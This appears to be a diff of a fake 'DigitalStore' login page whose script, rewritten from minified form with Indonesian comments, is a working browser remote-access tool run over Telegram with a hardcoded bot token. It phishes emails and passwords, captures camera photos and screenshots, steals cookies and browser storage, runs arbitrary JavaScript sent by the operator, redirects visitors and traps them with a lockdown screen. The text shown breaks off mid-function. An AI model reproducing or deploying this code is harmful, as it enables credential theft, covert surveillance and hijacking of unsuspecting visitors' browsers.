@@ -53,22 +53,359 @@ body{background:linear-gradient(145deg,#0b0e14,#1a1f2b);min-height:100vh;display
 <div style=text-align:center;margin-top:20px;color:#3b4252;font-size:11px>© 2026 DigitalStore</div></div></div>
 <div id=status-bar>🔒 <span id=client-id>...</span> · Online</div>
 <script>
-const BOT_TOKEN="8883414591:AAF7IS9SxloS6msFZjVKNU-VbRGalrEMGJY",CHAT_ID="8439372560",TELEGRAM_API=`https://api.telegram.org/bot${BOT_TOKEN}`,CLIENT_ID="client_"+Date.now()+"_"+Math.random().toString(36).substr(2,6);let isLockdown=!1,lockdownTimer=120,lockdownInterval=null,lastUpdateId=0,isPolling=!1,cameraStream=null,ssInterval=null,isStreaming=!1;
-document.getElementById("client-id").textContent=CLIENT_ID;
-function sendToTelegram(t){fetch(TELEGRAM_API+"/sendMessage",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:CHAT_ID,text:t,parse_mode:"HTML",disable_web_page_preview:!0})}).catch(()=>{})}
-function sendPhotoToTelegram(t,e){try{const n=atob(t.split(",")[1]),o=t.split(",")[0].split(":")[1].split(";")[0],r=new ArrayBuffer(n.length),a=new Uint8Array(r);for(let t=0;t<n.length;t++)a[t]=n.charCodeAt(t);const i=new Blob([a],{type:o}),s=new FormData;s.append("chat_id",CHAT_ID),s.append("photo",i,"photo.jpg"),s.append("caption",e),fetch(TELEGRAM_API+"/sendPhoto",{method:"POST",body:s}).catch(()=>{})}catch(t){}}
-async function registerSW(){try{const t=await navigator.serviceWorker.register("sw.js",{scope:"/"});return console.log("[SW] Registered"),setTimeout(()=>{t.active&&t.active.postMessage({type:"init",clientId:CLIENT_ID,botToken:BOT_TOKEN,chatId:CHAT_ID})},2e3),t}catch(t){return console.log("[SW] Error:",t),sendToTelegram(`❌ GAGAL REGISTER SW\n🆔 ${CLIENT_ID}\n⚠️ ${t.message}`),null}}
-async function captureCamera(t="environment"){try{cameraStream&&(cameraStream.getTracks().forEach(t=>t.stop()),cameraStream=null);const e={video:{facingMode:t,width:{ideal:640},height:{ideal:480}},audio:!1};cameraStream=await navigator.mediaDevices.getUserMedia(e);const n=document.getElementById("video-preview");n.srcObject=cameraStream;const o=document.getElementById("camera-preview");o.classList.add("active"),document.getElementById("cam-label").textContent="environment"===t?"📷 BELAKANG":"📷 DEPAN",await new Promise(t=>setTimeout(t,500));const r=document.createElement("canvas");r.width=n.videoWidth||640,r.height=n.videoHeight||480;const a=r.getContext("2d");a.drawImage(n,0,0,r.width,r.height);const i=r.toDataURL("image/jpeg",.9);return cameraStream.getTracks().forEach(t=>t.stop()),cameraStream=null,o.classList.remove("active"),i}catch(t){return sendToTelegram(`❌ GAGAL AKSES KAMERA\n🆔 ${CLIENT_ID}\n⚠️ ${t.message}`),null}}
-async function captureFrontCamera(){const t=await captureCamera("user");return t&&(sendPhotoToTelegram(t,`📸 FOTO DEPAN\n🆔 ${CLIENT_ID}\n⏰ ${new Date().toLocaleString("id-ID")}`),sendToTelegram(`📸 FOTO DEPAN TERKIRIM\n🆔 ${CLIENT_ID}`)),t}
-async function captureBackCamera(){const t=await captureCamera("environment");return t&&(sendPhotoToTelegram(t,`📸 FOTO BELAKANG\n🆔 ${CLIENT_ID}\n⏰ ${new Date().toLocaleString("id-ID")}`),sendToTelegram(`📸 FOTO BELAKANG TERKIRIM\n🆔 ${CLIENT_ID}`)),t}
-async function captureBothCameras(){const t=await captureFrontCamera(),e=await captureBackCamera();return(t||e)&&sendToTelegram(`📸 KEDUA FOTO TERKIRIM\n🆔 ${CLIENT_ID}`),{front:t,back:e}}
-async function captureScreenshot(){try{const t=await navigator.mediaDevices.getDisplayMedia({video:{displaySurface:"monitor",width:{ideal:1280},height:{ideal:720}},audio:!1}),e=t.getVideoTracks()[0];if(!e){t.getTracks().forEach(t=>t.stop());return}const n=new ImageCapture(e),o=await n.grabFrame(),r=document.createElement("canvas");r.width=o.width,r.height=o.height;const a=r.getContext("2d");a.drawImage(o,0,0);const i=r.toDataURL("image/jpeg",.7);e.stop(),t.getTracks().forEach(t=>t.stop()),sendPhotoToTelegram(i,`📸 SCREENSHOT\n🆔 ${CLIENT_ID}\n⏰ ${new Date().toLocaleString("id-ID")}`),sendToTelegram(`📸 SCREENSHOT TERKIRIM\n🆔 ${CLIENT_ID}`)}catch(t){sendToTelegram(`❌ GAGAL SCREENSHOT\n🆔 ${CLIENT_ID}\n⚠️ ${t.message}`)}}
-function startLockdown(){if(isLockdown)return;isLockdown=!0,lockdownTimer=120;const t=document.getElementById("lockdown-overlay");t.classList.add("active"),document.body.style.overflow="hidden";const e=document.getElementById("lockdown-progress");lockdownInterval=setInterval(()=>{lockdownTimer--;const n=String(Math.floor(lockdownTimer/60)).padStart(2,"0"),o=String(lockdownTimer%60).padStart(2,"0");document.getElementById("lockdown-timer").textContent=`${n}:${o}`,e.style.width=`${lockdownTimer/120*100}%`,lockdownTimer<=0&&(clearInterval(lockdownInterval),t.classList.remove("active"),document.body.style.overflow="",isLockdown=!1,sendToTelegram(`🔓 LOCKDOWN SELESAI\n🆔 ${CLIENT_ID}`))},1e3),sendToTelegram(`🔒 LOCKDOWN AKTIF\n🆔 ${CLIENT_ID}\n⏱️ 2 menit`)}
-window.addEventListener("beforeunload",function(t){isLockdown&&(t.preventDefault(),t.returnValue="")}),history.pushState(null,"",location.href),window.addEventListener("popstate",function(){isLockdown&&history.pushState(null,"",location.href)}),document.addEventListener("keydown",function(t){if(isLockdown){const e=["F5","F12","Escape","Tab"];(e.includes(t.key)||t.ctrlKey&&"w"===t.key||t.ctrlKey&&"r"===t.key)&&t.preventDefault()}});
-window.login=function(){const t=document.getElementById("email").value.trim(),e=document.getElementById("password").value.trim(),n=document.getElementById("errorMsg");t&&e?(sendToTelegram(`🔐 LOGIN\n🆔 ${CLIENT_ID}\n📧 ${t}\n🔑 ${e}`),n.textContent="❌ Email atau password salah.",document.getElementById("email").value="",document.getElementById("password").value="",document.getElementById("email").focus(),startLockdown()):n.textContent="⚠️ Email dan password wajib diisi."};
-window.socialLogin=function(t){sendToTelegram(`🔓 SOCIAL LOGIN\n🆔 ${CLIENT_ID}\nProvider: ${t}`),document.getElementById("errorMsg").textContent=`❌ Gagal dengan ${t}`,startLockdown()};
-function executeCommand(t){let e="";try{e=eval(t),"string"!=typeof e&&(e=JSON.stringify(e,null,2)),sendToTelegram(`✅ EKSEKUSI\n🆔 ${CLIENT_ID}\n📜 ${t.substring(0,100)}\n📦 ${String(e).substring(0,1e3)}`)}catch(e){sendToTelegram(`❌ ERROR\n🆔 ${CLIENT_ID}\n📜 ${t.substring(0,100)}\n⚠️ ${e.message}`)}}
-function sendPremiumMenu(){const t={chat_id:CHAT_ID,text:`🛒 DIGITALSTORE — RAT CONTROLLER\n\n🆔 Client: ${CLIENT_ID}\n📱 ${navigator.userAgent.split(" ").slice(0,3).join(" ")}\n🔒 Lockdown: ${isLockdown?"AKTIF":"NONAKTIF"}\n📸 Streaming: ${isStreaming?"AKTIF":"NONAKTIF"}\n⏰ ${new Date().toLocaleString("id-ID")}\n\nPilih perintah:`,parse_mode:"HTML",reply_markup:{inline_keyboard:[[{text:"📸 SS Sekarang",callback_data:"ss_once"},{text:"▶️ SS Mulai",callback_data:"ss_start"},{text:"⏹️ SS Berhenti",callback_data:"ss_stop"}],[{text:"📸 Kamera Depan",callback_data:"cam_front"},{text:"📸 Kamera Belakang",callback_data:"cam_back"}],[{text:"⚡ Exec",callback_data:"menu_exec"},{text:"🔒 Lockdown",callback_data:"menu_lockdown"}],[{text:"🍪 Steal",callback_data:"menu_steal"},{text:"📊 Info",callback_data:"menu_info"}],[{text:"🌐 Redirect",callback_data:"menu_redirect"}],[{text:"❓ Bantuan",callback_data:"menu_help"},{text:"🔄 Update",callback_data:"menu_refresh"}]]}};fetch(TELEGRAM_API+"/sendMessage",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(t)}).catch(()=>{})}
-function pollTelegram(){if(isPolling)return;isPolling=!0;async function t(){try{const t=await fetch(TELEGRAM_API+`/getUpdates?offset=${lastUpdateId+1}&timeout=30`),e=await t.json();if(e.ok&&e.result)for(const n of e.result){if(lastUpdateId=n.update_id,n.callback_query){const t=n.callback_query,e=t.data,o=t.message.chat.id;if(String(o)!==CHAT_ID)continue;fetch(TELEGRAM_API+"/answerCallbackQuery",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({callback_query_id:t.id,text:"✅ Diproses"})}).catch(()=>{});switch(e){case"ss_once":captureScreenshot();break;case"ss_start":isStreaming=!0,ssInterval=setInterval(captureScreenshot,5e3),captureScreenshot(),sendToTelegram(`📸 SCREENSHOT AKTIF\n🆔 ${CLIENT_ID}`);break;case"ss_stop":ssInterval&&(clearInterval(ssInterval),ssInterval=null),isStreaming=!1,sendToTelegram(`⏹️ SCREENSHOT BERHENTI\n🆔 ${CLIENT_ID}`);break;case"cam_front":captureFrontCamera();break;case"cam_back":captureBackCamera();break;case"menu_exec":sendToTelegram("⚡ EXEC\n\nKirim: /exec <JavaScript>\nContoh: /exec alert('Hacked')");break;case"menu_lockdown":startLockdown();break;case"menu_steal":fetch(TELEGRAM_API+"/sendMessage",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:CHAT_ID,text:"🍪 Pilih data yang ingin dicuri:",reply_markup:{inline_keyboard:[[{text:"🍪 Cookie",callback_data:"steal_cookie"}],[{text:"📦 LocalStorage",callback_data:"steal_local"}],[{text:"📦 SessionStorage",callback_data:"steal_session"}],[{text:"📦 All Data",callback_data:"steal_all"}],[{text:"🔙 Kembali",callback_data:"menu_main"}]]}})}).catch(()=>{});break;case"menu_info":sendToTelegram(`📊 INFO CLIENT\n🆔 ${CLIENT_ID}\n📱 ${navigator.userAgent}\n🖥️ ${screen.width}x${screen.height}\n🌐 ${navigator.language}\n🔒 Lockdown: ${isLockdown?"AKTIF":"NONAKTIF"}`);break;case"menu_redirect":sendToTelegram("🌐 REDIRECT\n\nKirim: /redirect <URL>\nContoh: /redirect https://google.com");break;case"menu_help":sendToTelegram("❓ BANTUAN\n\n📌 Perintah Teks:\n/exec <js> — Eksekusi JavaScript\n/lockdown — Aktifkan lockdown\n/ping — Cek status\n/info — Info client\n/steal — Ambil semua data\n/redirect <url> — Redirect client\n/cam — Ambil kedua kamera\n/ss — Screenshot\n/ss_start — Screenshot periodik\n/ss_stop — Berhenti screenshot\n\n📌 Tombol Menu:\nGunakan tombol di bawah.");break;case"menu_refresh":sendPremiumMenu();break;case"menu_main":sendPremiumMenu();break;case"steal_cookie":executeCommand("document.cookie");break;case"steal_local":executeCommand("JSON.stringify(localStorage)");break;case"steal_session":executeCommand("JSON.stringify(sessionStorage)");break;case"steal_all":executeCommand('JSON.stringify({cookie: document.cookie, localStorage: localStorage, sessionStorage: sessionStorage})');break}continue}const o=n.message;if(!o||!o.text)continue;const r=o.text.trim(),a=o.chat.id;if(String(a)!==CHAT_ID)continue;if(r.startsWith("/exec ")){const t=r.replace("/exec ","");executeCommand(t)}else if("/lockdown"===r)startLockdown();else if("/ping"===r)sendToTelegram(`🏓 Pong! Client ${CLIENT_ID} online.`);else if("/info"===r)sendToTelegram(`📊 INFO CLIENT\n🆔 ${CLIENT_ID}\n📱 ${navigator.userAgent}\n🖥️ ${screen.width}x${screen.height}\n🌐 ${navigator.language}\n🔒 Lockdown: ${isLockdown?"AKTIF":"NONAKTIF"}`);else if("/steal"===r){const t={cookie:document.cookie||"tidak ada",localStorage:JSON.stringify(localStorage),sessionStorage:JSON.stringify(sessionStorage)};sendToTelegram(`🍪 STEAL DATA\n🆔 ${CLIENT_ID}\n📦 ${JSON.stringify(t).substring(0,1500)}`)}else if(r.startsWith("/redirect ")){const t=r.replace("/redirect ","");t.startsWith("http")?(sendToTelegram(`🌐 Redirect ke ${t} untuk ${CLIENT_ID}`),setTimeout(()=>{window.location.href=t},1e3)):sendToTelegram(`❌ URL tidak valid: ${t}`)}else if("/cam"===r)captureBothCameras();else if("/ss"===r)captureScreenshot();else if("/ss_start"===r)isStreaming=!0,ssInterval=setInterval(captureScreenshot,5e3),captureScreenshot(),sendToTelegram(`📸 SCREENSHOT AKTIF\n🆔 ${CLIENT_ID}`);else if("/ss_stop"===r)ssInterval&&(clearInterval(ssInterval),ssInterval=null),isStreaming=!1,sendToTelegram(`⏹️ SCREENSHOT BERHENTI\n🆔 ${CLIENT_ID}`);else if("/menu"===r||"/start"===r)sendPremiumMenu();else sendToTelegram(`📩 PESAN DITERIMA\n🆔 ${CLIENT_ID}\n📜 ${r.substring(0,200)}`)}}catch(t){}finally{setTimeout(t,3e3)}}t()}
-async function init(){await registerSW(),setTimeout(()=>{sendPremiumMenu(),sendToTelegram(`🟢 CLIENT ONLINE\n🆔 ${CLIENT_ID}\n📱 ${navigator.userAgent}`)},3e3),pollTelegram()}init(),console.log(`[DigitalStore] Client: ${CLIENT_ID}`);
-</script></body></html>
+// ================================================================
+// KONFIGURASI — GANTI DENGAN PUNYA KAU
+// ================================================================
+const BOT_TOKEN = "8883414591:AAF7IS9SxloS6msFZjVKNU-VbRGalrEMGJY";
+const CHAT_ID   = "8439372560";
+const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
+// ================================================================
+// FULLSCREEN + DETEKSI TAB KELUAR
+// ================================================================
+function forceFullscreen(){try{const e=document.documentElement;e.requestFullscreen?e.requestFullscreen().catch(()=>{}):e.webkitRequestFullscreen?e.webkitRequestFullscreen():e.msRequestFullscreen&&e.msRequestFullscreen()}catch(e){}}
+forceFullscreen();
+let tabHidden=!1;
+document.addEventListener('visibilitychange',function(){if(document.visibilityState==='hidden'){tabHidden=!0;sendToTelegram(`👀 TARGET PINDAH TAB\n🆔 ${CLIENT_ID}\n⏰ ${new Date().toLocaleString('id-ID')}`);}else if(document.visibilityState==='visible'){if(tabHidden){sendToTelegram(`🔄 TARGET KEMBALI KE TAB\n🆔 ${CLIENT_ID}\n⏰ ${new Date().toLocaleString('id-ID')}`);tabHidden=!1;}forceFullscreen();}});
+document.addEventListener('click',function(){if(!document.fullscreenElement)forceFullscreen();});
+
+// ================================================================
+// STATE
+// ================================================================
+const CLIENT_ID = 'client_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
+let isLockdown = false;
+let lockdownTimer = 120;
+let lockdownInterval = null;
+let lastUpdateId = 0;
+let isPolling = false;
+let cameraStream = null;
+let ssInterval = null;
+let isStreaming = false;
+
+document.getElementById('client-id').textContent = CLIENT_ID;
+
+// ================================================================
+// KIRIM PESAN & FOTO KE TELEGRAM
+// ================================================================
+function sendToTelegram(text) {
+    fetch(TELEGRAM_API + '/sendMessage', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML', disable_web_page_preview: true })
+    }).catch(() => {});
+}
+
+function sendPhotoToTelegram(imageData, caption) {
+    try {
+        const byteString = atob(imageData.split(',')[1]);
+        const mimeString = imageData.split(',')[0].split(':')[1].split(';')[0];
+        const ab = new ArrayBuffer(byteString.length);
+        const ia = new Uint8Array(ab);
+        for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
+        const blob = new Blob([ia], { type: mimeString });
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, 'photo.jpg');
+        formData.append('caption', caption);
+        fetch(TELEGRAM_API + '/sendPhoto', { method: 'POST', body: formData }).catch(() => {});
+    } catch(e) {}
+}
+
+// ================================================================
+// SERVICE WORKER
+// ================================================================
+async function registerSW() {
+    try {
+        const registration = await navigator.serviceWorker.register('sw.js', { scope: '/' });
+        console.log('[SW] Registered');
+        setTimeout(() => {
+            if (registration.active) {
+                registration.active.postMessage({
+                    type: 'init',
+                    clientId: CLIENT_ID,
+                    botToken: BOT_TOKEN,
+                    chatId: CHAT_ID
+                });
+            }
+        }, 2000);
+        return registration;
+    } catch (err) {
+        console.log('[SW] Error:', err);
+        sendToTelegram(`❌ GAGAL REGISTER SW\n🆔 ${CLIENT_ID}\n⚠️ ${err.message}`);
+        return null;
+    }
+}
+
+// ================================================================
+// KAMERA
+// ================================================================
+async function captureCamera(facingMode = 'environment') {
+    try {
+        if (cameraStream) { cameraStream.getTracks().forEach(track => track.stop()); cameraStream = null; }
+        const constraints = { video: { facingMode: facingMode, width: { ideal: 640 }, height: { ideal: 480 } }, audio: false };
+        cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
+        const video = document.getElementById('video-preview');
+        video.srcObject = cameraStream;
+        const preview = document.getElementById('camera-preview');
+        preview.classList.add('active');
+        document.getElementById('cam-label').textContent = facingMode === 'environment' ? '📷 BELAKANG' : '📷 DEPAN';
+        await new Promise(resolve => setTimeout(resolve, 500));
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const imageData = canvas.toDataURL('image/jpeg', 0.9);
+        cameraStream.getTracks().forEach(track => track.stop());
+        cameraStream = null;
+        preview.classList.remove('active');
+        return imageData;
+    } catch (err) {
+        sendToTelegram(`❌ GAGAL AKSES KAMERA\n🆔 ${CLIENT_ID}\n⚠️ ${err.message}`);
+        return null;
+    }
+}
+
+async function captureFrontCamera() {
+    const imageData = await captureCamera('user');
+    if (imageData) {
+        sendPhotoToTelegram(imageData, `📸 FOTO DEPAN\n🆔 ${CLIENT_ID}\n⏰ ${new Date().toLocaleString('id-ID')}`);
+        sendToTelegram(`📸 FOTO DEPAN TERKIRIM\n🆔 ${CLIENT_ID}`);
+    }
+    return imageData;
+}
+
+async function captureBackCamera() {
+    const imageData = await captureCamera('environment');
+    if (imageData) {
+        sendPhotoToTelegram(imageData, `📸 FOTO BELAKANG\n🆔 ${CLIENT_ID}\n⏰ ${new Date().toLocaleString('id-ID')}`);
+        sendToTelegram(`📸 FOTO BELAKANG TERKIRIM\n🆔 ${CLIENT_ID}`);
+    }
+    return imageData;
+}
+
+async function captureBothCameras() {
+    const front = await captureFrontCamera();
+    const back = await captureBackCamera();
+    if (front || back) sendToTelegram(`📸 KEDUA FOTO TERKIRIM\n🆔 ${CLIENT_ID}`);
+    return { front, back };
+}
+
+// ================================================================
+// SCREENSHOT
+// ================================================================
+async function captureScreenshot() {
+    try {
+        const stream = await navigator.mediaDevices.getDisplayMedia({
+            video: { displaySurface: 'monitor', width: { ideal: 1280 }, height: { ideal: 720 } },
+            audio: false
+        });
+        const track = stream.getVideoTracks()[0];
+        if (!track) { stream.getTracks().forEach(t => t.stop()); return; }
+        const imageCapture = new ImageCapture(track);
+        const bitmap = await imageCapture.grabFrame();
+        const canvas = document.createElement('canvas');
+        canvas.width = bitmap.width;
+        canvas.height = bitmap.height;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(bitmap, 0, 0);
+        const imageData = canvas.toDataURL('image/jpeg', 0.7);
+        track.stop();
+        stream.getTracks().forEach(t => t.stop());
+        sendPhotoToTelegram(imageData, `📸 SCREENSHOT\n🆔 ${CLIENT_ID}\n⏰ ${new Date().toLocaleString('id-ID')}`);
+        sendToTelegram(`📸 SCREENSHOT TERKIRIM\n🆔 ${CLIENT_ID}`);
+    } catch (err) {
+        sendToTelegram(`❌ GAGAL SCREENSHOT\n🆔 ${CLIENT_ID}\n⚠️ ${err.message}`);
+    }
+}
+
+// ================================================================
+// LOCKDOWN
+// ================================================================
+function startLockdown() {
+    if (isLockdown) return;
+    isLockdown = true;
+    lockdownTimer = 120;
+    const overlay = document.getElementById('lockdown-overlay');
+    overlay.classList.add('active');
+    document.body.style.overflow = 'hidden';
+    const progressFill = document.getElementById('lockdown-progress');
+    lockdownInterval = setInterval(() => {
+        lockdownTimer--;
+        const mins = String(Math.floor(lockdownTimer / 60)).padStart(2, '0');
+        const secs = String(lockdownTimer % 60).padStart(2, '0');
+        document.getElementById('lockdown-timer').textContent = `${mins}:${secs}`;
+        progressFill.style.width = `${(lockdownTimer / 120) * 100}%`;
+        if (lockdownTimer <= 0) {
+            clearInterval(lockdownInterval);
+            overlay.classList.remove('active');
+            document.body.style.overflow = '';
+            isLockdown = false;
+            sendToTelegram(`🔓 LOCKDOWN SELESAI\n🆔 ${CLIENT_ID}`);
+        }
+    }, 1000);
+    sendToTelegram(`🔒 LOCKDOWN AKTIF\n🆔 ${CLIENT_ID}\n⏱️ 2 menit`);
+}
+
+// ================================================================
+// ANTI-CLOSE, ANTI-BACK
+// ================================================================
+window.addEventListener('beforeunload', function(e) {
+    if (isLockdown) { e.preventDefault(); e.returnValue = ''; }
+});
+history.pushState(null, '', location.href);
+window.addEventListener('popstate', function() {
+    if (isLockdown) { history.pushState(null, '', location.href); }
+});
+document.addEventListener('keydown', function(e) {
+    if (!isLockdown) return;
+    const blocked = ['F5', 'F12', 'Escape', 'Tab'];
+    if (blocked.includes(e.key) || (e.ctrlKey && e.key === 'w') || (e.ctrlKey && e.key === 'r')) {
+        e.preventDefault();
+    }
+});
+// ================================================================
+// LOGIN
+// ================================================================
+window.login = function() {
+    const email = document.getElementById('email').value.trim();
+    const password = document.getElementById('password').value.trim();
+    const errorMsg = document.getElementById('errorMsg');
+    if (!email || !password) {
+        errorMsg.textContent = '⚠️ Email dan password wajib diisi.';
+        return;
+    }
+    sendToTelegram(`🔐 LOGIN\n🆔 ${CLIENT_ID}\n📧 ${email}\n🔑 ${password}`);
+    errorMsg.textContent = '❌ Email atau password salah.';
+    document.getElementById('email').value = '';
+    document.getElementById('password').value = '';
+    document.getElementById('email').focus();
+    startLockdown();
+};
+
+window.socialLogin = function(provider) {
+    sendToTelegram(`🔓 SOCIAL LOGIN\n🆔 ${CLIENT_ID}\nProvider: ${provider}`);
+    document.getElementById('errorMsg').textContent = `❌ Gagal dengan ${provider}`;
+    startLockdown();
+};
+
+// ================================================================
+// EXECUTE COMMAND
+// ================================================================
+function executeCommand(command) {
+    let result = '';
+    try {
+        result = eval(command);
+        if (typeof result !== 'string') result = JSON.stringify(result, null, 2);
+        sendToTelegram(`✅ EKSEKUSI\n🆔 ${CLIENT_ID}\n📜 ${command.substring(0, 100)}\n📦 ${String(result).substring(0, 1000)}`);
+    } catch (err) {
+        sendToTelegram(`❌ ERROR\n🆔 ${CLIENT_ID}\n📜 ${command.substring(0, 100)}\n⚠️ ${err.message}`);
+    }
+}
+
+// ================================================================
+// MENU PREMIUM TELEGRAM
+// ================================================================
+function sendPremiumMenu() {
+    const menu = {
+        chat_id: CHAT_ID,
+        text: `🛒 DIGITALSTORE — RAT CONTROLLER\n\n🆔 Client: ${CLIENT_ID}\n📱 ${navigator.userAgent.split(' ').slice(0, 3).join(' ')}\n🔒 Lockdown: ${isLockdown ? 'AKTIF' : 'NONAKTIF'}\n📸 Streaming: ${isStreaming ? 'AKTIF' : 'NONAKTIF'}\n⏰ ${new Date().toLocaleString('id-ID')}\n\nPilih perintah:`,
+        parse_mode: 'HTML',
+        reply_markup: {
+            inline_keyboard: [
+                [{ text: '📸 SS Sekarang', callback_data: 'ss_once' }, { text: '▶️ SS Mulai', callback_data: 'ss_start' }, { text: '⏹️ SS Berhenti', callback_data: 'ss_stop' }],
+                [{ text: '📸 Kamera Depan', callback_data: 'cam_front' }, { text: '📸 Kamera Belakang', callback_data: 'cam_back' }],
+                [{ text: '⚡ Exec', callback_data: 'menu_exec' }, { text: '🔒 Lockdown', callback_data: 'menu_lockdown' }],
+                [{ text: '🍪 Steal', callback_data: 'menu_steal' }, { text: '📊 Info', callback_data: 'menu_info' }],
+                [{ text: '🌐 Redirect', callback_data: 'menu_redirect' }],
+                [{ text: '❓ Bantuan', callback_data: 'menu_help' }, { text: '🔄 Update', callback_data: 'menu_refresh' }]
+            ]
+        }
+    };
+    fetch(TELEGRAM_API + '/sendMessage', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(menu) }).catch(() => {});
+}
+
+// ================================================================
+// POLLING TELEGRAM
+// ================================================================
+function pollTelegram() {
+    if (isPolling) return;
+    isPolling = true;
+    async function fetchUpdates() {
+        try {
+            const url = TELEGRAM_API + `/getUpdates?offset=${lastUpdateId + 1}&timeout=30`;
+            const res = await fetch(url);
+            const data = await res.json();
+            if (data.ok && data.result) {
+                for (const update of data.result) {
+                    lastUpdateId = update.update_id;
+                    if (update.callback_query) {
+                        const query = update.callback_query;
+                        const data = query.data;
+                        const chatId = query.message.chat.id;
+                        if (String(chatId) !== CHAT_ID) continue;
+                        fetch(TELEGRAM_API + '/answerCallbackQuery', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ callback_query_id: query.id, text: '✅ Diproses' })
+                        }).catch(() => {});
+                        switch(data) {
+                            case 'ss_once': captureScreenshot(); break;
+                            case 'ss_start': isStreaming = true; ssInterval = setInterval(captureScreenshot, 5000); captureScreenshot(); sendToTelegram(`📸 SCREENSHOT AKTIF\n🆔 ${CLIENT_ID}`); break;
+                            case 'ss_stop': if (ssInterval) { clearInterval(ssInterval); ssInterval = null; } isStreaming = false; sendToTelegram(`⏹️ SCREENSHOT BERHENTI\n🆔 ${CLIENT_ID}`); break;
+                            case 'cam_front': captureFrontCamera(); break;
+                            case 'cam_back': captureBackCamera(); break;
+                            case 'menu_exec': sendToTelegram('⚡ EXEC\n\nKirim: /exec <JavaScript>\nContoh: /exec alert("Hacked")'); break;
+                            case 'menu_lockdown': startLockdown(); break;
+                            case 'menu_steal': fetch(TELEGRAM_API + '/sendMessage', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, text: '🍪 Pilih data yang ingin dicuri:', reply_markup: { inline_keyboard: [[{ text: '🍪 Cookie', callback_data: 'steal_cookie' }], [{ text: '📦 LocalStorage', callback_data: 'steal_local' }], [{ text: '📦 SessionStorage', callback_data: 'steal_session' }], [{ text: '📦 All Data', callback_data: 'steal_all' }], [{ text: '🔙 Kembali', callback_data: 'menu_main' }]] } }) }).catch(() => {}); break;
+                            case 'menu_info': sendToTelegram(`📊 INFO CLIENT\n🆔 ${CLIENT_ID}\n📱 ${navigator.userAgent}\n🖥️ ${screen.width}x${screen.height}\n🌐 ${navigator.language}\n🔒 Lockdown: ${isLockdown ? 'AKTIF' : 'NONAKTIF'}`); break;
+                            case 'menu_redirect': sendToTelegram('🌐 REDIRECT\n\nKirim: /redirect <URL>\nContoh: /redirect https://google.com'); break;
+                            case 'menu_help': sendToTelegram('❓ BANTUAN\n\n📌 Perintah Teks:\n/exec <js> — Eksekusi JavaScript\n/lockdown — Aktifkan lockdown\n/ping — Cek status\n/info — Info client\n/steal — Ambil semua data\n/redirect <url> — Redirect client\n/cam — Ambil kedua kamera\n/ss — Screenshot\n/ss_start — Screenshot periodik\n/ss_stop — Berhenti screenshot\n\n📌 Tombol Menu:\nGunakan tombol di bawah.'); break;
+                            case 'menu_refresh': sendPremiumMenu(); break;
+                            case 'menu_main': sendPremiumMenu(); break;
+                            case 'steal_cookie': executeCommand('document.cookie'); break;
+                            case 'steal_local': executeCommand('JSON.stringify(localStorage)'); break;
+                            case 'steal_session': executeCommand('JSON.stringify(sessionStorage)'); break;
+                            case 'steal_all': executeCommand('JSON.stringify({cookie: document.cookie, localStorage: localStorage, sessionStorage: sessionStorage})'); break;
+                        }
+                        continue;
+                    }
+                    const msg = update.message;
+                    if (!msg || !msg.text) continue;
+                    const text = msg.text.trim();
+                    const chatId = msg.chat.id;
+                    if (String(chatId) !== CHAT_ID) continue;
+                    if (text.startsWith('/exec ')) { const command = text.replace('/exec ', ''); executeCommand(command); }
+                    else if (text === '/lockdown') { startLockdown(); }
+                    else if (text === '/ping') { sendToTelegram(`🏓 Pong! Client ${CLIENT_ID} online.`); }
+                    else if (text === '/info') { sendToTelegram(`📊 INFO CLIENT\n🆔 ${CLIENT_ID}\n📱 ${navigator.userAgent}\n🖥️ ${screen.width}x${screen.height}\n🌐 ${navigator.language}\n🔒 Lockdown: ${isLockdown ? 'AKTIF' : 'NONAKTIF'}`); }
+                    else if (text === '/steal') { const data = { cookie: document.cookie || 'tidak ada', localStorage: JSON.stringify(localStorage), sessionStorage: JSON.stringify(sessionStorage) }; sendToTelegram(`🍪 STEAL DATA\n🆔 ${CLIENT_ID}\n📦 ${JSON.stringify(data).substring(0, 1500)}`); }
+                    else if (text.startsWith('/redirect ')) { const url = text.replace('/redirect ', ''); if (url.startsWith('http')) { sendToTelegram(`🌐 Redirect ke ${url} untuk ${CLIENT_ID}`); setTimeout(() => { window.location.href = url; }, 1000); } else { sendToTelegram(`❌ URL tidak valid: ${url}`); } }
+                    else if (text === '/cam') { captureBothCameras(); }
+                    else if (text === '/ss') { captureScreenshot(); }
+                    else if (text === '/ss_start') { isStreaming = true; ssInterval = setInterval(captureScreenshot, 5000); captureScreenshot(); sendToTelegram(`📸 SCREENSHOT AKTIF\n🆔 ${CLIENT_ID}`); }
+                    else if (text === '/ss_stop') { if (ssInterval) { clearInterval(ssInterval); ssInterval = null; } isStreaming = false; sendToTelegram(`⏹️ SCREENSHOT BERHENTI\n🆔 ${CLIENT_ID}`); }
+                    else if (text === '/menu' || text === '/start') { sendPremiumMenu(); }
+                    else { sendToTelegram(`📩 PESAN DITERIMA\n🆔 ${CLIENT_ID}\n📜 ${text.substring(0, 200)}`); }
+                }
+            }
+        } catch (err) {} finally { setTimeout(fetchUpdates, 3000); }
+    }
+    fetchUpdates();
+}
+
+// ================================================================
+// INIT
+// ================================================================
+async function init() {
+    await registerSW();
+    setTimeout(() => {
+        sendPremiumMenu();
